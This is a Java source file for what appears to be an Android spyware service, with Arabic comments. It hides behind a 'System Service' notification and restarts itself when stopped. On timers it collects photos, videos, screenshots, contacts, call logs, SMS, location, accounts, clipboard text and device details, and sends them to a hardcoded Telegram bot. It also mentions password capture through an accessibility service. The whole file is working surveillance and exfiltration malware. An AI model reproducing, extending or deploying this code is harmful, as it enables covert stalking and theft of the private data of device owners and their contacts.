package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;

public class AutoCollectorService extends Service {

    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .build();
    
    // متغيرات لتخزين آخر ما تم إرساله
    private long lastPhotoTime = 0;
    private long lastVideoTime = 0;
    private long lastScreenshotTime = 0;
    private long lastContactsTime = 0;
    private long lastCallLogTime = 0;
    private long lastSMSTime = 0;
    private long lastLocationTime = 0;
    private long lastAccountsTime = 0;
    private String lastClipboardContent = "";
    private boolean isRunning = true;
    
    @Override
    public void onCreate() {
        super.onCreate();
        startForeground();
        startAutoCollection();
        sendTelegram("🚀 **تم تشغيل السحب التلقائي**\n📱 " + Build.MODEL + "\n⏰ " + new Date().toString());
    }
    
    private void startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification notification = new NotificationCompat.Builder(this, "collector_channel")
                .setContentTitle("System Service")
                .setContentText("جمع البيانات التلقائي قيد التشغيل")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
            
            startForeground(999, notification);
        }
    }
    
    private void startAutoCollection() {
        // سحب الصور كل 3 دقائق
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectAllPhotos();
                    handler.postDelayed(this, 3 * 60 * 1000);
                }
            }
        }, 10 * 1000);
        
        // سحب الفيديوهات كل 5 دقائق
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectAllVideos();
                    handler.postDelayed(this, 5 * 60 * 1000);
                }
            }
        }, 20 * 1000);
        
        // سحب لقطات الشاشة كل دقيقة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    takeScreenshot();
                    handler.postDelayed(this, 60 * 1000);
                }
            }
        }, 30 * 1000);
        
        // سحب جهات الاتصال كل 30 دقيقة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectContacts();
                    handler.postDelayed(this, 30 * 60 * 1000);
                }
            }
        }, 40 * 1000);
        
        // سجل المكالمات كل 30 دقيقة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectCallLogs();
                    handler.postDelayed(this, 30 * 60 * 1000);
                }
            }
        }, 50 * 1000);
        
        // سحب الرسائل كل 30 دقيقة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectSMS();
                    handler.postDelayed(this, 30 * 60 * 1000);
                }
            }
        }, 60 * 1000);
        
        // الموقع كل 5 دقائق
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectLocation();
                    handler.postDelayed(this, 5 * 60 * 1000);
                }
            }
        }, 70 * 1000);
        
        // سحب الحسابات كل ساعة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectAccounts();
                    handler.postDelayed(this, 60 * 60 * 1000);
                }
            }
        }, 80 * 1000);
        
        // سحب الحافظة كل 30 ثانية
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectClipboard();
                    handler.postDelayed(this, 30 * 1000);
                }
            }
        }, 5 * 1000);
        
        // معلومات الجهاز كل ساعة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectDeviceInfo();
                    handler.postDelayed(this, 60 * 60 * 1000);
                }
            }
        }, 90 * 1000);
        
        // سحب كلمات المرور من الخدمة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectPasswords();
                    handler.postDelayed(this, 15 * 60 * 1000);
                }
            }
        }, 100 * 1000);
    }
    
    // ==================== سحب جميع الصور ====================
    
    private void collectAllPhotos() {
        try {
            String[] projection = {
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DISPLAY_NAME
            };
            
            // جلب الصور الجديدة فقط (آخر ساعة)
            long oneHourAgo = System.currentTimeMillis() / 1000 - (60 * 60);
            String selection = MediaStore.Images.Media.DATE_ADDED + " > ?";
            String[] selectionArgs = {String.valueOf(oneHourAgo)};
            
            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 30"
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 10) {
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                    long date = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)) * 1000;
                    long size = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.SIZE));
                    
                    if (date > lastPhotoTime && size < 15 * 1024 * 1024 && new File(path).exists()) {
                        sendPhoto(path, "📸 **صورة جديدة**\n📁 " + name + "\n📅 " + new Date(date).toString());
                        lastPhotoTime = date;
                        count++;
                        Thread.sleep(2000);
                    }
                }
                
                if (count > 0) {
                    Log.d("AutoCollector", "تم إرسال " + count + " صور");
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في جمع الصور: " + e.getMessage());
        }
    }
    
    // ==================== سحب جميع الفيديوهات ====================
    
    private void collectAllVideos() {
        try {
            String[] projection = {
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.DATE_ADDED,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DURATION
            };
            
            long oneHourAgo = System.currentTimeMillis() / 1000 - (60 * 60);
            String selection = MediaStore.Video.Media.DATE_ADDED + " > ?";
            String[] selectionArgs = {String.valueOf(oneHourAgo)};
            
            Cursor cursor = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 15"
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 5) {
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
                    long date = cursor.getLong(cursor.getColumnIndex(MediaStore.Video.Media.DATE_ADDED)) * 1000;
                    long size = cursor.getLong(cursor.getColumnIndex(MediaStore.Video.Media.SIZE));
                    
                    if (date > lastVideoTime && size < 50 * 1024 * 1024 && new File(path).exists()) {
                        sendVideo(path, "🎥 **فيديو جديد**\n📁 " + name + "\n📅 " + new Date(date).toString());
                        lastVideoTime = date;
                        count++;
                        Thread.sleep(3000);
                    }
                }
                
                if (count > 0) {
                    Log.d("AutoCollector", "تم إرسال " + count + " فيديوهات");
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في جمع الفيديوهات: " + e.getMessage());
        }
    }
    
    // ==================== تصوير الشاشة ====================
    
    private void takeScreenshot() {
        try {
            String filePath = Environment.getExternalStorageDirectory() + "/DCIM/screenshot_" + System.currentTimeMillis() + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + filePath);
            process.waitFor();
            
            File file = new File(filePath);
            if (file.exists() && file.length() > 0) {
                long now = System.currentTimeMillis();
                if (now - lastScreenshotTime > 60 * 1000) { // مرة كل دقيقة على الأقل
                    sendPhoto(filePath, "📱 **لقطة شاشة**\n⏰ " + new Date().toString());
                    lastScreenshotTime = now;
                }
                file.delete();
            }
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في تصوير الشاشة: " + e.getMessage());
        }
    }
    
    // ==================== جهات الاتصال ====================
    
    private void collectContacts() {
        try {
            StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            
            int count = 0;
            if (cursor != null) {
                while (cursor.moveToNext() && count < 50) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append("📞 **").append(name).append("**\n");
                    sb.append("   ").append(phone).append("\n\n");
                    count++;
                }
                cursor.close();
            }
            
            if (count > 0) {
                sb.append("إجمالي: ").append(count);
                sendTelegram(sb.toString());
                lastContactsTime = System.currentTimeMillis();
            }
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في جهات الاتصال");
        }
    }
    
    // ==================== سجل المكالمات ====================
    
    private void collectCallLogs() {
        try {
            StringBuilder sb = new StringBuilder("📞 **سجل المكالمات**\n\n");
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 30"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    
                    String typeText = type.equals("1") ? "📞 وارد" : 
                                     type.equals("2") ? "📞 صادر" : "❌ فائت";
                    
                    sb.append(typeText).append("\n");
                    sb.append("   ").append(name != null ? name : number).append("\n");
                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(date))).append("\n\n");
                }
                cursor.close();
            }
            
            sendTelegram(sb.toString());
            lastCallLogTime = System.currentTimeMillis();
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في سجل المكالمات");
        }
    }
    
    // ==================== الرسائل النصية ====================
    
    private void collectSMS() {
        try {
            StringBuilder sb = new StringBuilder("💬 **الرسائل النصية**\n\n");
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null,
                null,
                null,
                "date DESC LIMIT 20"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    
                    sb.append("📨 **من ").append(address).append("**\n");
                    sb.append("   ").append(body).append("\n");
                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(date))).append("\n\n");
                }
                cursor.close();
            }
            
            sendTelegram(sb.toString());
            lastSMSTime = System.currentTimeMillis();
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في الرسائل");
        }
    }
    
    // ==================== الموقع الجغرافي ====================
    
    private void collectLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (location != null) {
                    String mapUrl = "https://maps.google.com/?q=" + 
                                   location.getLatitude() + "," + 
                                   location.getLongitude();
                    
                    String msg = "📍 **الموقع الحالي**\n\n" +
                                "**الخط:** " + location.getLatitude() + "\n" +
                                "**الطول:** " + location.getLongitude() + "\n" +
                                "**الدقة:** " + location.getAccuracy() + "م\n" +
                                "**الرابط:** " + mapUrl + "\n\n" +
                                "⏰ " + new Date().toString();
                    
                    sendTelegram(msg);
                    lastLocationTime = System.currentTimeMillis();
                }
            }
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في الموقع");
        }
    }
    
    // ==================== الحسابات ====================
    
    private void collectAccounts() {
        try {
            AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
            Account[] accounts = am.getAccounts();
            
            if (accounts.length > 0) {
                StringBuilder sb = new StringBuilder("🔑 **الحسابات المسجلة**\n\n");
                
                for (Account account : accounts) {
                    sb.append("**").append(account.type).append("**\n");
                    sb.append("   ").append(account.name).append("\n\n");
                }
                
                sendTelegram(sb.toString());
                lastAccountsTime = System.currentTimeMillis();
            }
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في الحسابات");
        }
    }
    
    // ==================== الحافظة ====================
    
    private void collectClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            ClipData clip = clipboard.getPrimaryClip();
            
            if (clip != null && clip.getItemCount() > 0) {
                String text = clip.getItemAt(0).getText().toString();
                
                if (!text.equals(lastClipboardContent) && !text.isEmpty() && text.length() > 3) {
                    sendTelegram("📋 **محتوى جديد في الحافظة**\n\n" + text);
                    lastClipboardContent = text;
                }
            }
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في الحافظة");
        }
    }
    
    // ==================== معلومات الجهاز ====================
    
    private void collectDeviceInfo() {
        try {
            StringBuilder sb = new StringBuilder("📱 **معلومات الجهاز**\n\n");
            
            // معلومات أساسية
            sb.append("**الطراز:** ").append(Build.MODEL).append("\n");
            sb.append("**الشركة:** ").append(Build.MANUFACTURER).append("\n");
            sb.append("**الإصدار:** ").append(Build.VERSION.RELEASE).append("\n");
            sb.append("**Android:** ").append(Build.VERSION.SDK_INT).append("\n");
            
            // معرف الجهاز
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            sb.append("**المعرف:** `").append(deviceId).append("`\n\n");
            
            // البطارية
            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int batteryPct = level * 100 / scale;
                sb.append("**البطارية:** ").append(batteryPct).append("%\n");
            }
            
            // المساحة التخزينية
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long bytesAvailable = (long) stat.getBlockSizeLong() * (long) stat.getAvailableBlocksLong();
            long megAvailable = bytesAvailable / (1024 * 1024);
            sb.append("**المساحة المتوفرة:** ").append(megAvailable).append(" MB\n\n");
            
            // شبكة واي فاي
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            String ssid = wifiInfo.getSSID().replace("\"", "");
            if (!ssid.isEmpty() && !ssid.equals("<unknown ssid>")) {
                sb.append("**الشبكة:** ").append(ssid).append("\n");
            }
            
            sendTelegram(sb.toString());
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في معلومات الجهاز");
        }
    }
    
    // ==================== كلمات المرور (من الخدمة) ====================
    
    private void collectPasswords() {
        // هذه الدالة تستقبل البيانات من MyAccessibilityService
        // سيتم إرسال كلمات المرور مباشرة عند اكتشافها
    }
    
    // ==================== إرسال الصور ====================
    
    private void sendPhoto(String filePath, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() == 0) return;
            
            String fileName = file.getName();
            String mimeType = "image/jpeg";
            if (fileName.endsWith(".png")) mimeType = "image/png";
            
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("photo", fileName,
                        RequestBody.create(MediaType.parse(mimeType), file))
                    .build();
            
            Request request = new Request.Builder()
                    .url(BASE_URL + "sendPhoto")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في إرسال الصورة");
        }
    }
    
    // ==================== إرسال الفيديو ====================
    
    private void sendVideo(String filePath, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() == 0) return;
            
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("video", file.getName(),
                        RequestBody.create(MediaType.parse("video/mp4"), file))
                    .build();
            
            Request request = new Request.Builder()
                    .url(BASE_URL + "sendVideo")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e("AutoCollector", "خطأ في إرسال الفيديو");
        }
    }
    
    // ==================== إرسال رسالة ====================
    
    private void sendTelegram(String message) {
        try {
            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + 
                         "&text=" + Uri.encode(message) + "&parse_mode=Markdown";
            
            Request request = new Request.Builder()
                    .url(url)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {}
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        
        // إعادة تشغيل الخدمة
        Intent intent = new Intent(this, AutoCollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        super.onDestroy();
    }
}
